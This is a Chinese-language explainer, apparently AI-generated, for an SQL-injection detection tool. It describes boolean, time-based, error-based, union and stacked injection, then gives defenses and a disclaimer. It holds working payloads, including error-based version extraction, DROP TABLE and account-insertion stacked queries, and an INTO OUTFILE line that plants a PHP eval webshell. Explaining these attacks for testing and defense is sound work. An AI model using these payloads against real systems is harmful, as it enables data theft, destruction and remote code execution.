---
AIGC:
  ContentProducer: '001191110102MAD55U9H0F10002'
  ContentPropagator: '001191110102MAD55U9H0F10002'
  Label: '1'
  ProduceID: '187aa377-555c-4cd2-805f-2defc5946b15'
  PropagateID: '187aa377-555c-4cd2-805f-2defc5946b15'
  ReservedCode1: '91132a34-c39d-4589-9658-64a7834bc7fb'
  ReservedCode2: '91132a34-c39d-4589-9658-64a7834bc7fb'
---

# SQL 注入探测工具 - 原理说明

## 概述

SQL 注入（SQL Injection）是一种将恶意 SQL 代码插入应用程序查询的攻击技术。当应用程序将用户输入直接拼接到 SQL 语句中且未做充分过滤时，攻击者可以通过构造特殊输入改变原 SQL 的逻辑，从而实现数据窃取、认证绕过甚至命令执行。

本工具支持 5 种主流 SQL 注入类型的自动化检测。

---

## 1. Boolean-based Blind Injection（布尔盲注）

**原理：** 应用程序不会直接返回查询结果或错误信息，但 true/false 不同的条件会导致页面内容差异（如"存在"/"不存在"、不同长度的响应）。

**攻击流程：**
```
原始请求:  ?id=1
真条件:    ?id=1 AND 1=1       → 页面正常（与基线一致）
假条件:    ?id=1 AND 1=2       → 页面异常（内容不同）
```

通过逐位构造条件可逐字符提取数据：
```
?id=1 AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'
```

**检测方法：** 对比 `AND 1=1` 和 `AND 1=2` 的响应长度与基线差异，若真条件接近基线、假条件偏差较大，则判定存在布尔盲注。

---

## 2. Time-based Blind Injection（时间盲注）

**原理：** 页面既无内容差异也无错误信息，唯一可利用的侧信道是响应时间。通过注入 `SLEEP()` / `WAITFOR DELAY` / `pg_sleep()` 等延时函数，根据返回时间判断条件真假。

**攻击流程：**
```
MySQL:   ?id=1 AND IF(1=1, SLEEP(5), 0)-- -
MSSQL:   ?id=1; WAITFOR DELAY '0:0:5'-- -
PgSQL:   ?id=1; SELECT pg_sleep(5)-- -
```

若响应延迟约等于设定的秒数，说明延时函数被执行，即注入成功。

**检测方法：** 注入 `SLEEP(delay)` 后测量响应时间，若 >= delay-1s 则判定存在时间盲注。

---

## 3. Error-based Injection（报错注入）

**原理：** 应用程序将数据库报错信息直接输出到页面。攻击者故意触发错误，让报错信息中携带查询结果。

**常见报错函数：**
| 数据库     | 报错函数/手法                                                          |
|-----------|-----------------------------------------------------------------------|
| MySQL     | `EXTRACTVALUE()`, `UPDATEXML()`, `FLOOR(RAND())` 报错                 |
| MSSQL     | `CONVERT()`, `CAST()` 类型转换报错                                     |
| Oracle    | `CTXSYS.DRITHSX.SN()`, `UTL_INADDR.GET_HOST_NAME()`                   |
| PostgreSQL| `CAST()` 类型转换报错                                                  |

**攻击示例：**
```sql
-- MySQL UPDATEXML 报错提取版本
1 AND updatexml(1, CONCAT(0x7e, (SELECT @@version)), 1)-- -

-- MySQL FLOOR 报错
1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
```

**检测方法：** 注入单引号、双引号及各类报错 payload，匹配响应中是否包含数据库关键字报错信息（如 `SQL syntax...MySQL`、`ORA-xxxxx`、`SQL Server` 等）。

---

## 4. Union-based Injection（联合查询注入）

**原理：** 当注入点位于 `SELECT` 语句且页面直接显示查询结果时，可利用 `UNION` 拼接额外的 SELECT 语句，将数据回显到页面。

**攻击流程：**
```
Step 1 - 确定列数:
  ?id=1 ORDER BY 1-- -    → 正常
  ?id=1 ORDER BY 2-- -    → 正常
  ...
  ?id=1 ORDER BY N-- -    → 报错 → 列数 = N-1

Step 2 - 联合查询:
  ?id=1 UNION SELECT NULL,NULL,...,NULL-- -

Step 3 - 替换回显位:
  ?id=1 UNION SELECT @@version,NULL,...-- -
```

**检测方法：** 通过 `ORDER BY` 自增探测列数，然后构造 `UNION SELECT` 验证是否可正常返回，状态码 200 且无报错即为可注入。

---

## 5. Stacked Queries Injection（堆叠注入）

**原理：** 当后端使用支持多语句执行的数据库连接方式时，可用分号 `;` 分隔，在原 SQL 后追加任意 SQL 语句，甚至执行 `INSERT`、`UPDATE`、`DELETE`、`DROP` 等破坏性操作。

**攻击示例：**
```sql
-- 查询 + 插入
?id=1; INSERT INTO users(username,password) VALUES('hacker','123456')-- -

-- 查询 + 删表
?id=1; DROP TABLE users-- -

-- MySQL 写 WebShell
?id=1; SELECT '<?php @eval($_POST[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php'-- -
```

**检测方法：** 注入 `; SELECT 1-- -` 等堆叠语句，若响应正常（200 且无报错）则可能存在堆叠注入。结合时间盲注（`; SLEEP(delay)`)可进一步确认。

---

## 防御建议

| 措施                  | 说明                                                                 |
|----------------------|----------------------------------------------------------------------|
| **参数化查询**         | 使用预编译语句 (Prepared Statement)，从根本上隔离代码与数据            |
| **输入校验**           | 白名单验证参数类型、长度、格式                                        |
| **最小权限原则**       | 数据库账号仅授予必要权限，禁止 `FILE`、`EXEC` 等高危权限               |
| **关闭报错输出**       | 生产环境禁止将数据库错误信息返回给用户                                 |
| **WAF 防护**          | 部署 Web 应用防火墙拦截常见注入特征                                   |
| **ORM 框架**          | 使用 SQLAlchemy / Django ORM 等，默认参数化查询                        |

---

## 免责声明

本工具仅供安全研究与授权渗透测试使用。未经目标所有者明确授权，使用本工具对任何系统进行扫描或攻击均属违法行为。使用者需自行承担一切法律责任。

> AI生成